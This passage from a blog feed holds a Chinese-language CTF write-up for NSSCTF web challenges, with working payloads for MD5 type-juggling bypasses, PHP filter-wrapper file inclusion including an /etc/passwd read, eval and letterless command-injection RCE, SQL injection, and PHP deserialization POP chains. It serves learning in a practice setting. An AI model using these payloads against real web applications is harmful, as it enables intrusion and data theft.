class=\"line\">threading.Thread(target=read,args=(session,)).start()  </span><br><span class=\"line\">event.<span class=\"built_in\">set</span>()</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/26/nessctf/",
            "url": "https://hq185187.github.io/2023/04/26/nessctf/",
            "title": "NSSCTF1",
            "date_published": "2023-04-25T16:51:04.501Z",
            "content_html": "<h3 id=\"1easy_md5\"><a class=\"markdownIt-Anchor\" href=\"#1easy_md5\">#</a> 1.easy_md5</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;?php     highlight_file(__FILE__);    include &#x27;flag2.php&#x27;;       if (isset($_GET[&#x27;name&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123;    $name = $_GET[&#x27;name&#x27;];    $password = $_POST[&#x27;password&#x27;];       if ($name != $password &amp;&amp; md5($name) == md5($password))&#123;           echo $flag;       &#125;       else &#123;           echo &quot;wrong!&quot;;       &#125;       &#125;   else &#123;       echo &#x27;wrong!&#x27;;   &#125;   ?&gt;`</span><br></pre></td></tr></table></figure>\n<p>md5 弱类型比较<br>\n (1).0e 绕过<br>\n以下是一些字符串 md5 值以 0e 开头<br>\n QNKCDZO<br>\n240610708<br>\ns878926199a<br>\ns155964671a<br>\ns21587387a</p>\n<p>(2). 数组绕过<br>\n md5 () 函数计算的是一个字符串的哈希值，对于数组则返回 false<br>\n <code>payload:?a[]=1&amp;b[]=2</code></p>\n<h3 id=\"2caidao\"><a class=\"markdownIt-Anchor\" href=\"#2caidao\">#</a> 2.caidao</h3>\n<p>(1) antsword 连<br>\n (2) hackbar 传参:`wllm=system (‘cat …/…/…/flag’);</p>\n<h3 id=\"3include\"><a class=\"markdownIt-Anchor\" href=\"#3include\">#</a> 3.include</h3>\n<p>(1) filter 伪协议</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p>这题用 file 协议也可以但是没有得到 flag<br>\n 可以这样:?file= <code>file:///etc/passwd</code> <br>\n 但是 <code>?file=file:///var/www/flag.php</code>  不行<br>\n<strong>想深刻了解伪协议的来这里</strong></p>\n<h3 id=\"4ezrce\"><a class=\"markdownIt-Anchor\" href=\"#4ezrce\">#</a> 4.ezrce</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;?php   error_reporting(0);   highlight_file(__FILE__);   if(isset($_GET[&#x27;url&#x27;]))   &#123;   eval($_GET[&#x27;url&#x27;]);   &#125;`</span><br></pre></td></tr></table></figure>\n<p>学习 Linux 命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls / 列出根目录(\\)下的所有目录</span><br><span class=\"line\">发现flag文件在root根目录下,cat /flllllllag来cat根目录下的flag文件</span><br></pre></td></tr></table></figure>\n<p><strong>深刻了解 Linux 命令来这里</strong></p>\n<h3 id=\"5easysql-suctf2019\"><a class=\"markdownIt-Anchor\" href=\"#5easysql-suctf2019\">#</a> 5.EasySQL SUCTF2019</h3>\n<p>fuzz:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; or 1=1--+</span><br><span class=\"line\">1&#x27; order by 3--+</span><br><span class=\"line\">1&#x27; and updatexml(1,concat(0x7e,database()),1)--+</span><br><span class=\"line\">1&#x27; and if(length(database())&gt;1,sleep(5),1)--+</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>堆叠注入:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1;show databases#</span><br><span class=\"line\">1;show tables#</span><br><span class=\"line\">这两个还可以</span><br><span class=\"line\">1;show columns from &#x27;Flag&#x27;#</span><br><span class=\"line\">失败</span><br></pre></td></tr></table></figure>\n<p>它的 SQL 查询语句是:<br>\n <code>select $_POST['query']||flag from Flag</code> <br>\n 说真的我猜不出来<br>\n当 sql_mode 设置了 PIPES_AS_CONCAT 时，|| 是字符串连接符，相当于 concat () 函数</p>\n<p><code>payload1:*,1</code> <br>\nsql: <code>select *,1||flag from Flag</code> , 这样查询出了 Flag 表的所有内容<br>\n此处的 1 是临时增加一列，列名为 1||flag 且这一列的所有值都为 1</p>\n<p>payload2: <code>1;set sql_mode=PIPES_AS_CONCAT;select 1 sql:</code> select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</p>\n<p>返回一个列名为 1||flag, 列元素为 1flag 的值的表</p>\n<h3 id=\"6zjctf-2019nizhuansiwei\"><a class=\"markdownIt-Anchor\" href=\"#6zjctf-2019nizhuansiwei\">#</a> 6.[ZJCTF 2019]NiZhuanSiWei</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$text = $_GET[&quot;text&quot;];</span><br><span class=\"line\">$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">$password = $_GET[&quot;password&quot;];</span><br><span class=\"line\">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class=\"line\">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class=\"line\">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class=\"line\">        echo &quot;Not now!&quot;;</span><br><span class=\"line\">        exit(); </span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        include($file);  //useless.php</span><br><span class=\"line\">        $password = unserialize($password);</span><br><span class=\"line\">        echo $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>第一步：绕过 file_get_contents<br>\n(1)php://input<br>\n?text=php://input<br>\npost 传参: <code>welcome to the zjctf</code> <br>\n (2) data 协议<br>\n <code>?text=data://text/plain,welcome to the zjctf</code> <br>\n 根据提示的 useless.php 可以发现可以用伪协议读取<br>\n <code>file=php://filter/read=convert.base64-encode/resource=useless.php</code> <br>\n 第一步:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=file=php://input&amp;&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br><span class=\"line\"></span><br><span class=\"line\">post传参:welcome to the zjct</span><br></pre></td></tr></table></figure>\n<p>经过 base64 解码得到 useless.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\"></span><br><span class=\"line\">class Flag&#123;  //flag.php  </span><br><span class=\"line\">    public $file;  </span><br><span class=\"line\">    public function __tostring()&#123;  </span><br><span class=\"line\">        if(isset($this-&gt;file))&#123;  </span><br><span class=\"line\">            echo file_get_contents($this-&gt;file); </span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">?&gt;  </span><br></pre></td></tr></table></figure>\n<p>注意 tostring 魔术方法在对象被当作字符串处理时会调用，index 里就是 echo</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Flag&#123;    </span><br><span class=\"line\">    public $file=&#x27;flag.php&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$p=new Flag();</span><br><span class=\"line\">echo urlencode(serialize($p));</span><br><span class=\"line\">?&gt;  </span><br><span class=\"line\"></span><br><span class=\"line\">O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></pre></td></tr></table></figure>\n<p>`<br>\n 最终 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=file=php://input&amp;&amp;file=useless.php&amp;&amp;password=</span><br><span class=\"line\">O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br><span class=\"line\"></span><br><span class=\"line\">post传参:welcome to the zjct</span><br></pre></td></tr></table></figure>\n<p>检查可发现源代码注释部分有 flag</p>\n<h3 id=\"7easy_md5\"><a class=\"markdownIt-Anchor\" href=\"#7easy_md5\">#</a> 7.easy_md5</h3>\n<p>F12-&gt; 网络 -&gt; 请求头 -&gt;hint</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$password</span>,<span class=\"literal\">true</span>).<span class=\"string\">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content: ffifdyop</span><br><span class=\"line\">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class=\"line\">raw: &#x27;or&#x27;6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c</span><br><span class=\"line\">string: &#x27;or&#x27;6]!r,b</span><br></pre></td></tr></table></figure>\n<p>注意:<br>\n <code>\\和后面三个字符算一个字符</code> <br>\n sql:``select * from admin where username=‘admin’ and password=’&quot;‘or’6]!r,b&quot;’;</p>\n<p>在 mysql 里面，在用作布尔型判断时，以 1 开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如 password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于 password=‘xxx’ or 1  ，也就相当于 password=‘xxx’ or true，所以返回值就是 true</p>\n<p>关键是:<mark>’ or 1’</mark><br>\n答案肯定不止一个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content: 129581926211651571912466741651878684928</span><br><span class=\"line\">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class=\"line\">raw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1&#x27;or&#x27;8</span><br><span class=\"line\">string: T0Do#&#x27;or&#x27;8</span><br></pre></td></tr></table></figure>\n<p>复现:<br>\n![[Pasted image 20230425192651.png]]</p>\n<p>然后就是常规的数组绕过，0e 绕过了</p>\n<h3 id=\"8swpuctf-2021-新生赛hardrce\"><a class=\"markdownIt-Anchor\" href=\"#8swpuctf-2021-新生赛hardrce\">#</a> 8.[SWPUCTF 2021 新生赛] hardrce</h3>\n<h4 id=\"无字母rce\"><a class=\"markdownIt-Anchor\" href=\"#无字母rce\">#</a> 无字母 rce</h4>\n<ol>\n<li>system () 函数</li>\n</ol>\n<ul>\n<li>执行外部程序并显示输出资料</li>\n</ul>\n<ol start=\"2\">\n<li>eval () 函数</li>\n</ol>\n<ul>\n<li>把字符串当 php 代码执行，必须以；结尾</li>\n</ul>\n<ol start=\"3\">\n<li>php 的取反问题～<br>\n 此题过滤了很多黑名单，根据题目提示是无字母 rce 想到了～</li>\n</ol>\n<ul>\n<li>对于数字取反的规则可以看看这篇:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1dpbGxpYW1zV2F5bmUvYXJ0aWNsZS9kZXRhaWxzLzc4MjU5NTAx\">https://blog.csdn.net/WilliamsWayne/article/details/78259501</span></li>\n<li>对于字符取反，由于有大量的不可显字符，要 url 编码</li>\n<li>方法一:</li>\n<li>eg1.</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo urlencode(~&quot;phpinfo&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure>\n<p>payload:(~%8F%97%8F%96%91%99%90<br>\n)();</p>\n<p>配合 eval 函数可以直接把 phpinfo (); 当 php 代码执行<br>\n eg2.<br>\n 要构造 <code>assert($_POST[1])</code>  语句，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a=urlencode(~&quot;assert&quot;);</span><br><span class=\"line\">$b=urlencode(~&quot;_POST&quot;);</span><br><span class=\"line\">echo $a;</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo $b;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">得到</span><br><span class=\"line\">%9E%8C%8C%9A%8D%8B</span><br><span class=\"line\">%A0%AF%B0%AC%AB</span><br><span class=\"line\"></span><br><span class=\"line\">$_=~(%9E%8C%8C%9A%8D%8B); //$_=assert</span><br><span class=\"line\">$__=~(%A0%AF%B0%AC%AB);   //$__=_POST</span><br><span class=\"line\">$___=$$__;         //$___=$_POST</span><br><span class=\"line\">$_($___[1]);      //assert($_POST[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">payload(写在一行):</span><br><span class=\"line\">$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">post:</span><br><span class=\"line\">1=phpinfo();</span><br></pre></td></tr></table></figure>\n<p>常见取反 url:</p>\n<ol>\n<li>system:%8C%86%8C%8B%9A%92</li>\n<li>ls /:%93%8C%DF%D0<br>\n <code>system(ls);==(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code></li>\n<li>cat:%9C%9E%8B</li>\n<li>cat /flag:%9C%9E%8B%DF%D0%99%93%9E%98</li>\n<li>cat /flllllaaaaaaggggggg:%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98<br>\n 可自行运行得:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo urlencode(~&quot;xxx&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>方法二:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(&quot;卢&quot;.encode(&quot;utf8&quot;))</span><br><span class=\"line\">b&#x27;\\xe5\\x8d\\xa2&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$_=&quot;卢&quot;;</span><br><span class=\"line\">print(~($_&#123;1&#125;));</span><br><span class=\"line\">print(~&quot;\\x8d&quot;);</span><br><span class=\"line\">// 输出rr</span><br></pre></td></tr></table></figure>\n<p><code>$_&#123;1&#125;是\\x8d,\\x8d取反是r</code></p>\n<p>此题 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</span><br><span class=\"line\"></span><br><span class=\"line\">system(&quot;cat /flllllaaaaaaggggggg&quot;);</span><br></pre></td></tr></table></figure>\n<p><strong>深刻学习无字母 rce 来这里</strong></p>\n<h3 id=\"9pop\"><a class=\"markdownIt-Anchor\" href=\"#9pop\">#</a> 9.pop</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">show_source</span>(<span class=\"string\">&quot;index.php&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w44m</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$admin</span> = <span class=\"string\">&#x27;aaa&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$passwd</span> = <span class=\"string\">&#x27;123456&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Getflag</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;admin === <span class=\"string\">&#x27;w44m&#x27;</span> &amp;&amp; <span class=\"variable language_\">$this</span>-&gt;passwd === <span class=\"string\">&#x27;08067&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">include</span>(<span class=\"string\">&#x27;flag.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;admin;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;passwd;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;nono&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w22m</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$w00m</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;w00m;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w33m</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$w00m</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$w22m</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;w00m-&gt;&#123;<span class=\"variable language_\">$this</span>-&gt;w22m&#125;();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$w00m</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;w00m&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$w00m</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>入口:w22m.destruct, 让 w22m 的 $woom 为 w33m 对象，调用 w33m 的 toString 方法，让 w33m 的 <code>w00m</code>  为 w44m 对象，w22m 为字符串’Getflag ()’, 就能调用 w44m 的 Getflag () 方法<br>\n构造脚本:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w44m</span></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"variable\">$admin</span>=<span class=\"string\">&#x27;w44m&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"variable\">$passwd</span>=<span class=\"string\">&#x27;08067&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w22m</span></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"variable\">$w00m</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">w33m</span></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"variable\">$w00m</span>;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"variable\">$w22m</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">w22m</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;w00m=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">w33m</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;w00m-&gt;w00m=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">w44m</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;w00m-&gt;w22m=<span class=\"string\">&#x27;Getflag&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ 